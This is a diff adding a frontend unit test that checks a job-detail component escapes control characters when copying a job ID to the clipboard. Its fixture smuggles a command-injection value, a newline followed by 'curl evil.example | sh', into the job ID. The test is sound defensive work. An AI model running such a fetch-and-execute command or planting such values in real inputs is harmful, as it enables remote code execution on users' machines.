@@ -14,6 +14,7 @@ vi.mock('../hooks/use-jobs', async (orig) => ({
 }))
 
 import { type Job, type JobGrant, RequestError } from '../hooks/use-mux-api'
+import { UNSAFE_CHARS } from '../utils/unsafe-chars'
 import { JobDetail } from './job-detail'
 
 const NOW = Date.parse('2026-11-23T10:00:00Z')
@@ -69,6 +70,24 @@ describe('JobDetail', () => {
       fireEvent.click(screen.getByRole('button', { name: /^Copy the ID of/ })),
     )
     expect(screen.getByRole('alert')).toHaveTextContent('Could not copy')
+  })
+
+  it('copies no control character, whatever id and title it holds', async () => {
+    mockCopy.mockReset()
+    mockCopy.mockResolvedValue('ok')
+    const j = job({
+      id: '3f2a9c1e0b7d4a55\ncurl evil.example | sh\r',
+      title: 'Fix\tlogin\n\u001b[31m',
+    })
+    render(<JobDetail job={j} now={NOW} />)
+    await act(async () =>
+      fireEvent.click(screen.getByRole('button', { name: /^Copy the ID of/ })),
+    )
+    const line = String(mockCopy.mock.calls[0][0])
+    expect(line).not.toMatch(new RegExp(UNSAFE_CHARS.source, 'u'))
+    expect(line).toBe(
+      'termote job 3f2a9c1e0b7d4a55⟨U+000A⟩curl evil.example | sh⟨U+000D⟩ ("Fix⟨U+0009⟩login↵⟨U+001B⟩[31m"); see: termote agents job show 3f2a9c1e0b7d4a55⟨U+000A⟩curl evil.example | sh⟨U+000D⟩',
+    )
   })
 
   it('tells when a finished job may be removed, and how to keep it while it can change', () => {
